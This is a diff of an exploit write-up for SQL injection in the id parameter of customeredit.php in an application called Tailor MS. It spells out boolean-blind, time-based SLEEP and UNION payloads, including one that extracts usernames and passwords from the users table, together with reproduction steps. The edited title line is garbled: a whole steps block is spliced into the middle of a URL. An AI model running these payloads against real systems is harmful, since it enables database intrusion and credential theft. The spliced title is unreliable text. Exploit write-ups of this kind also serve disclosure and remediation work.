@@ -1,4 +1,12 @@
-# Exploit Title: Tailor MS – SQL Injection in customeredit.php (`http://localhost/tailor/customeredit.php?id=1`)
+# Exploit Title: Tailor MS – SQL Injection in customeredit.php (## Steps to Reproduce
+
+1. Browse to `http://localhost:8000/customeredit.php?id=1`.  
+2. Intercept the request and inject the following payload into the `id` parameter:
+    ```
+    http://localhost:8000/customeredit.php?id=1' UNION ALL SELECT 1,username,3,password,5,6,7,8 from users-- -
+    ```
+3. Observe the extracted username and password displayed in the application (see screenshot above).
+4. Confirm DBMS fingerprinting and data extraction as permitted by the app's DB privileges.//localhost:8000/customeredit.php?id=1`)
 
 **Date:** 2025-08-11  
 **Exploit Author:** Anonymous  
@@ -20,31 +28,31 @@ A SQL Injection vulnerability exists in the `customeredit.php` endpoint of **Tai
 
 ### Affected Endpoint
 
-- **URL:** `http://localhost/tailor/customeredit.php?id=1`
+- **URL:** `http://localhost:8000/customeredit.php?id=1`
 - **HTTP Method:** GET
 - **Vulnerable File:** `customeredit.php`
 - **Parameter:** `id`
 - **Vector Location:** GET
 
-### Injection Techniques (as identified by sqlmap)
+### Injection Techniques
 - **Type:** boolean-based blind
   - **Title:** AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
   - **Payload:** `id=1' AND 2559=(SELECT (CASE WHEN (2559=2559) THEN 2559 ELSE (SELECT 1757 UNION SELECT 8575) END))-- -`
 - **Type:** time-based blind
   - **Title:** MySQL >= 5.0.12 AND time-based blind (query SLEEP)
   - **Payload:** `id=1' AND (SELECT 8281 FROM (SELECT(SLEEP(5)))ygPp)-- kXlJ`
-- **Type:** UNION query
-  - **Title:** Generic UNION query (NULL) - 8 columns
-  - **Payload:** 
-```
-id=-8176' UNION ALL SELECT NULL,NULL,CONCAT(0x71626b7671,0x64656475626e4b44466c505772585052747461735643656b6f626f45626c75584c657a4c5772624b,0x717a717a71),NULL,NULL,NULL,NULL,NULL-- -
-```
+- **Type:** UNION query (exfiltration)
+  - **Title:** UNION query to extract username and password via UNION SELECT - 8 columns
+  - **Payload:**  
+    ```
+    http://localhost:8000/customeredit.php?id=1' UNION ALL SELECT 1,username,3,password,5,6,7,8 from users-- -
+    ```
 
 
 
-## Proof of Concept (Burp Repeater)
+## Proof of Concept (Firefox Screenshot)
 
-![burp-repeater-poc](poc.png)
+![exploit](exploit.png)
 
 ## SQLMap Summary
 
@@ -64,7 +72,7 @@ The vulnerable parameter is reflected into the SQL statement without proper vali
 
 ## Steps to Reproduce
 
-1. Browse to `http://localhost/tailor/customeredit.php?id=1`.  
+1. Browse to `http://localhost:8000/customeredit.php?id=1`.  
 2. Intercept the request and inject the provided payload(s) into parameter `customeredit.php?&<param>=...`.  
 3. Observe conditional responses / time delays / injected row reflections per technique above.  
 4. Confirm DBMS fingerprinting and data extraction as permitted by the app’s DB privileges.
@@ -74,7 +82,6 @@ The vulnerable parameter is reflected into the SQL statement without proper vali
 ![vulnerable-code](code_snippet.png)
 
 
-References
-OWASP: SQL Injection Prevention Cheat Sheet
-
+References  
+OWASP: SQL Injection Prevention Cheat Sheet  
 CWE-89: SQL Injection
